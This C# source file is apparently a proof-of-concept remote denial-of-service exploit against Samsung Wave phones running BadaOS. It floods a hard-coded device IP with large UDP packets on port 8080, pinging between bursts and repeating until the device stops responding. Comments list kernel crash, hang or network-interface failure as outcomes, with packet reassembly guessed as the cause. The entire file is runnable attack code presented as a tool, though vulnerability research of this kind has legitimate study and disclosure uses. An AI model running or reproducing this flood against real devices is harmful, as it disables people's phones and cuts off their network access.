using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BadaOS_Remote_DoS
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // BadaOS Samsung Wave 723 Remote DoS exploit
            // the following results are possible:
            // 1: The kernel crashes (device forcibly hard reboots)
            // 2: The device hangs
            // 3: The NIC crashes and refuses to receive or send any packets,
            // leaving the CPU stuck at 100% usage.
            // Attempting to do ANY NIC operation that is OUTGOING
            // (wifi disable / enable, scan networks, make request, etc)
            // hangs the device. Incoming operations such as
            // ICMP, HTTP requests, etc
            // get ignored silently and do not crash the device.
            //
            // ROOT CAUSE OF VULN (maybe): packet reassembly
            Console.Title = "Crash My Bada v5.0";
            string BADA_IP = "192.168.30.155";
            int PACKET_SIZE = 55000;
            PACKET_SIZE = Math.Min(65507, PACKET_SIZE);
            UdpClient udpClient = new UdpClient();
            byte[] buffer = new byte[PACKET_SIZE];
            udpClient.Connect(BADA_IP, 8080);
            Console.WriteLine("checking if device is online...");
            while (!CheckAlive(BADA_IP))
            {
                Thread.Sleep(1000);
            }
            Console.WriteLine("DEVICE IS ALIVE");
            Murder(udpClient, BADA_IP, buffer, PACKET_SIZE);
            for (int i = 1; i <= 30; i++)
            {
                Console.WriteLine($"sanity check {i}");
                if (CheckAlive(BADA_IP))
                {
                    Murder(udpClient, BADA_IP, buffer, PACKET_SIZE);
                }
                else
                {
                    break;
                }
            }
            Console.WriteLine("DEVICE IS DEAD");
            Console.ReadKey();
        }

        static bool CheckAlive(string ip)
        {
            Ping pong = new Ping();
            PingReply pongReply = pong.Send(ip, 2000);
            if (pongReply.Status == IPStatus.Success)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static void Murder(UdpClient udpClient, string BADA_IP, byte[] buffer, int PACKET_SIZE)
        {
            while (CheckAlive(BADA_IP))
            {
                Console.WriteLine("starting UDP flood...");
                for (int i = 0; i < 200; i++)
                {
                    udpClient.Send(buffer, PACKET_SIZE);
                }
                Console.WriteLine("sent 200 packets, checking for signs of life...");
            }
        }
    }
}
